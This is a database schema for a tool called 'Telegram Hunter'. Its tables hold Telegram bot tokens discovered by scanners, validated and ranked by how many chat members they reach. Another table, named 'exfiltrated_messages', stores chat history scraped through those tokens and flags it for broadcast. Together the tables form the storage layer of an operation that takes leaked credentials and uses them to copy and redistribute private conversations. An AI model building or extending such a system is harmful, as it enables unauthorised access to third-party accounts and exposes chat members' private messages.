-- ============================================================
-- Telegram Hunter — Database Schema (canonical, single source of truth)
-- Safe to re-run on a fresh DB: all statements use IF NOT EXISTS guards.
-- Do NOT add migrations/ patches alongside this file — amend here instead.
-- ============================================================


-- ============================================================
-- TABLE: discovered_credentials
-- Stores validated bot tokens found by scanners.
-- bot_token is always Fernet-encrypted at rest.
-- ============================================================
CREATE TABLE IF NOT EXISTS discovered_credentials (
    id           UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    bot_token    TEXT        NOT NULL,                          -- Fernet-encrypted
    token_hash   TEXT        NOT NULL UNIQUE,                   -- SHA-256 for dedup
    chat_id      BIGINT,
    bot_id       TEXT,
    bot_username TEXT,
    chat_name    TEXT,
    chat_type    TEXT,
    source       TEXT,
    status       TEXT        CHECK (status IN ('pending', 'active', 'revoked')) DEFAULT 'pending',
    meta         JSONB       DEFAULT '{}'::jsonb,
    created_at   TIMESTAMPTZ DEFAULT NOW(),
    updated_at   TIMESTAMPTZ DEFAULT NOW(),

    -- Bundle 4: STORED generated columns derived from meta jsonb.
    -- Postgres maintains these automatically — no app writes needed.
    -- Enables real INT sort/filter without jsonb string coercion.
    confidence_score INTEGER GENERATED ALWAYS AS (
        CASE
            WHEN meta ? 'confidence_score'
              AND jsonb_typeof(meta->'confidence_score') = 'number'
            THEN (meta->>'confidence_score')::int
            ELSE NULL
        END
    ) STORED,

    chat_member_count INTEGER GENERATED ALWAYS AS (
        CASE
            WHEN meta ? 'chat_member_count'
              AND jsonb_typeof(meta->'chat_member_count') = 'number'
            THEN (meta->>'chat_member_count')::int
            ELSE NULL
        END
    ) STORED
);

CREATE INDEX IF NOT EXISTS idx_creds_status   ON discovered_credentials(status);
CREATE INDEX IF NOT EXISTS idx_creds_bot_id   ON discovered_credentials(bot_id);

-- Partial indexes for confidence/member sort — only non-null rows indexed,
-- keeps index size bounded since most legacy rows score NULL.
CREATE INDEX IF NOT EXISTS idx_discovered_credentials_confidence_score
    ON discovered_credentials (confidence_score DESC NULLS LAST)
    WHERE confidence_score IS NOT NULL;

CREATE INDEX IF NOT EXISTS idx_discovered_credentials_chat_member_count
    ON discovered_credentials (chat_member_count DESC NULLS LAST)
    WHERE chat_member_count IS NOT NULL;


-- ============================================================
-- TABLE: exfiltrated_messages
-- Chat history scraped from discovered bots.
-- ============================================================
CREATE TABLE IF NOT EXISTS exfiltrated_messages (
    id                   UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    credential_id        UUID        REFERENCES discovered_credentials(id) ON DELETE CASCADE,
    telegram_msg_id      INT         NOT NULL,
    sender_name          TEXT,
    content              TEXT,
    media_type           TEXT        DEFAULT 'text',
    file_meta            JSONB       DEFAULT '{}'::jsonb,
    is_broadcasted       BOOLEAN     DEFAULT FALSE,
    broadcast_claimed_at TIMESTAMPTZ DEFAULT NULL,             -- distributed claim lock
    created_at           TIMESTAMPTZ DEFAULT NOW(),
    CONSTRAINT unique_msg_per_credential UNIQUE (credential_id, telegram_msg_id)
);

CREATE INDEX IF NOT EXISTS idx_messages_credential_id
    ON exfiltrated_messages(credential_id);

CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted
    ON exfiltrated_messages(is_broadcasted)
    WHERE is_broadcasted = FALSE;

CREATE INDEX IF NOT EXISTS idx_messages_claimed
    ON exfiltrated_messages(is_broadcasted, broadcast_claimed_at);


-- ============================================================
-- TABLE: telegram_accounts
-- User sessions added via /starthunter bot command.
-- ============================================================
CREATE TABLE IF NOT EXISTS telegram_accounts (
    id           UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    phone        TEXT        NOT NULL UNIQUE,
    session_path TEXT        NOT NULL,
    status       TEXT        CHECK (status IN ('active', 'inactive')) DEFAULT 'active',
    locked_by    TEXT,                                          -- distributed session lease
    locked_until TIMESTAMPTZ,
    created_at   TIMESTAMPTZ DEFAULT NOW(),
    updated_at   TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_accounts_phone  ON telegram_accounts(phone);
CREATE INDEX IF NOT EXISTS idx_accounts_status ON telegram_accounts(status);


-- ============================================================
-- TABLE: audit_logs
-- Persists high-importance security audit events.
-- Written by AuditLogger._persist_to_db() for compliance.
-- ============================================================
CREATE TABLE IF NOT EXISTS audit_logs (
    id            UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    timestamp     TIMESTAMPTZ DEFAULT NOW(),
    event_type    TEXT        NOT NULL,
    credential_id UUID        REFERENCES discovered_credentials(id) ON DELETE SET NULL,
    user_agent    TEXT        DEFAULT 'system',
    success       BOOLEAN     DEFAULT TRUE,
    details       JSONB       DEFAULT '{}'::jsonb
);

CREATE INDEX IF NOT EXISTS idx_audit_event_type ON audit_logs(event_type);
CREATE INDEX IF NOT EXISTS idx_audit_timestamp  ON audit_logs(timestamp);


-- ============================================================
-- TABLE: keepalive_log
-- Heartbeat records written by the keepalive system task.
-- ============================================================
CREATE TABLE IF NOT EXISTS keepalive_log (
    id         UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    status     TEXT        DEFAULT 'ok'
);


-- ============================================================
-- VIEW: discovered_credentials_public
-- Safe anon projection: excludes bot_token, token_hash,
-- bot_id/username, chat_id/name/type (PII / operational secrets).
-- Frontend and Supabase anon key queries hit this, never the raw table.
-- ============================================================
DROP VIEW IF EXISTS discovered_credentials_public;
CREATE VIEW discovered_credentials_public AS
SELECT
    id,
    created_at,
    source,
    status,
    meta,
    confidence_score,
    chat_member_count
FROM discovered_credentials;

GRANT SELECT ON discovered_credentials_public TO anon;
